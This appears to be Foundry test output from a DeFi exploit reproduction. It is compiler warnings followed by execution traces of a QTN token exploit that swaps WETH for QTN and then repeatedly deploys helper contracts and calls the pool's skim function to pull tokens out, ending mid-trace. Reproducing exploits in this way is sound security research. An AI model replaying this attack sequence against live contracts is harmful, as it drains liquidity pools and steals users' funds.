Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.19s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-01/QTN_exp.sol:23:5:
   |
23 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2023-01/QTN_exp.sol:39:9:
   |
39 |         address(WETH).call{value: 2 ether}("");
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (9302): Return value of low-level calls not used.
  --> src/test/2023-01/QTN_exp.sol:64:13:
   |
64 |             contractList[i].call(abi.encodeWithSignature("transferBack()"));
   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 231.79ms (192.87µs CPU time)

Ran 1 test for src/test/2023-01/QTN_exp.sol:ContractTest
[PASS] testExploit() (gas: 10158045)
Logs:
  Attacker WETH balance after exploit: 2.131376640477927235

Traces:
  [10295545] ContractTest::testExploit()
    ├─ [23731] WETH::fallback{value: 2000000000000000000}()
    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 2000000000000000000 [2e18])
    │   └─ ← [Stop] 
    ├─ [24420] WETH::approve(Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 2000000000000000000 [2e18]
    ├─ [135209] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(2000000000000000000 [2e18], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1674002987 [1.674e9])
    │   ├─ [8225] WETH::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 2000000000000000000 [2e18])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 2000000000000000000 [2e18])
    │   │   └─ ← [Return] true
    │   ├─ [7120] QTN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2504] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 3027310689825641549 [3.027e18], 25666645898426115635900466 [2.566e25], 1673553071 [1.673e9]
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [103564] Pair::swap(0, 10192416897278030927845485 [1.019e25], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [71005] QTN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10192416897278030927845485 [1.019e25])
    │   │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10192416897278030927845485 [1.019e25])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   │   └─ ← [Return] 15474229001148084708054981 [1.547e25]
    │   │   ├─ emit Sync(reserve0: 5027310689825641549 [5.027e18], reserve1: 15474229001148084708054981 [1.547e25])
    │   │   ├─ emit Swap(sender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 2000000000000000000 [2e18], amount1In: 0, amount0Out: 0, amount1Out: 10192416897278030927845485 [1.019e25], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [1120] QTN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 10192416897278030927845485 [1.019e25]
    │   └─ ← [Stop] 
    ├─ [0] VM::warp(1674003487 [1.674e9])
    │   └─ ← [Return] 
    ├─ [1120] QTN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 10192416897278030927845485 [1.019e25]
    ├─ [104265] → new QTNContract@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 410 bytes of code
    ├─ [16071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [73452] Pair::skim(QTNContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [60095] QTN::transfer(QTNContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xc7183455a4C133Ae270771860664b6B7ec320bB1
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xa0Cb889707d426A7A386870A03bc70d1b0697598
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x1d1499e622D69689cdf9004d05Ec547d650Ff211
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xA4AD4f68d0b91CFD19687c881e50f3A00242828c
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x03A6a84cD762D9707A21605b548aaaB891562aAb
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x15cF58144EF33af1e14b5208015d11F9143E27b9
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x212224D2F2d262cd093eE13240ca4873fcCBbA3C
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 5027310689825641549 [5.027e18]
    │   ├─ [5262] WETH::transfer(QTNContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 0)
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [702] QTN::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
    │   │   └─ ← [Return] 15729039423580035481251118 [1.572e25]
    │   ├─ [54495] QTN::transfer(QTNContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 254810422431950773196137 [2.548e23])
    │   │   ├─ emit Transfer(from: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], to: QTNContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], value: 254810422431950773196137 [2.548e23])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [104265] → new QTNContract@0x2a07706473244BC757E10F2a9E86fB532828afe3
    │   └─ ← [Return] 410 bytes of code
    ├─ [8071] QTN::transfer(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], 254810422431950773196137 [2.548e23])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B], value: 254810422431950773196137 [2.548e23])
    │   └─ ← [Return] true
    ├─ [67852] Pair::skim(QTNContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3])
    │   ├─ [534] WETH::balanceOf(Pair: [0xA8208dA95869060cfD40a23eb11F2158639c829B]) [staticcall]
